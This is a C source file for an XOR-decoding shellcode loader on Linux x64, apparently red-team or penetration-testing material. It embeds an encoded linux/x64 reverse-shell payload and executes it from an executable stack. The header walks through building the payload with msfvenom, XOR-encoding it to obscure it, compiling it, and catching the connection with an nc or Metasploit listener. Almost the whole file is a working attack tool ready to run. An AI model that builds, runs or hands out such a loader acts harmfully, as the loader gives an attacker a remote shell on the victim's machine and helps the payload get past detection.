/*
================================================================
simpleLoader.c — Simple XOR-Decoded Linux Shellcode Loader
================================================================
WHAT THIS DOES:
  A minimal C loader for Linux x64. Reads an XOR-encoded shellcode
  payload from the buf[] array, decodes it in-place using key 0xfa
  (decimal 250), then casts the decoded bytes as a function pointer
  and calls it to execute the shellcode.

  The -z execstack flag makes the stack executable so the shellcode
  can run from a global char/unsigned char array.

BEFORE YOU COMPILE — PREPARE YOUR SHELLCODE:
  1. Generate raw Linux shellcode on Kali:
       msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=<YOUR_IP> LPORT=443 -f raw -o shell.bin
       (Use shell_reverse_tcp for a simple shell, or meterpreter/reverse_tcp
        for a full meterpreter session)

  2. XOR-encode it with key 0xfa:
       Compile and run simpleXORencoder.c (in this same directory):
         gcc -o xorenc simpleXORencoder.c && ./xorenc
       Copy the printed \xNN\xNN... output.

       OR encode in Python directly:
         python3 -c "
         data=open('shell.bin','rb').read()
         enc=bytes(b^0xfa for b in data)
         print(''.join(f'\\\\x{b:02X}' for b in enc))
         "

  3. Paste the encoded bytes into buf[] below:
       Replace the entire unsigned char buf[] = "..." string.

COMPILE (on Linux/Kali):
  gcc -o simpleLoader simpleLoader.c -z execstack

  NOTE: -z execstack is required to allow code execution from the
  global buf[] array. Without it you'll get a Segmentation Fault.

  If your gcc version doesn't support -z execstack:
    sudo apt install gcc
    gcc --version  (ensure 9+)

RUN:
  ./simpleLoader

  The shellcode will connect back to your LHOST/LPORT.

START YOUR LISTENER FIRST (on Kali):
  nc -lvnp 443
  OR for meterpreter:
  msfconsole -q -x "use exploit/multi/handler; \
    set payload linux/x64/shell_reverse_tcp; \
    set LHOST <YOUR_IP>; set LPORT 443; exploit -j"

BEFORE COMPILING, CHANGE:
  - buf[] -> your XOR(0xfa)-encoded shellcode with YOUR IP/PORT
================================================================
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// To compile:
// gcc -o simpleLoader simpleLoader.c -z execstack

// XOR-encoded 'linux/x64/shell_reverse_tcp' payload (key: 0xfa)
unsigned char buf[] = "\x90\xD3\xA2\x63\x90\xF8\xA5\x90\xFB\xA4\xF5\xFF\xB2\x6D\xB2\x43\xF8\xFA\xFA\xAA\x3A\x52\xCB\xB9\xAB\xB2\x73\x1C\x90\xEA\xA0\x90\xD0\xA2\xF5\xFF\x90\xF9\xA4\xB2\x05\x34\x90\xDB\xA2\xF5\xFF\x8F\x0C\x90\xC1\xA2\x63\xB2\x41\xD5\x98\x93\x94\xD5\x89\x92\xFA\xA9\xB2\x73\x1D\xA8\xAD\xB2\x73\x1C\xF5\xFF\xFA";

int main (int argc, char **argv)
{
        int key = 250;
        int buf_len = (int) sizeof(buf);

        // Decode the payload
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }

        // Cast the shellcode to a function pointer and execute
        int (*ret)() = (int(*)())buf;
        ret();
}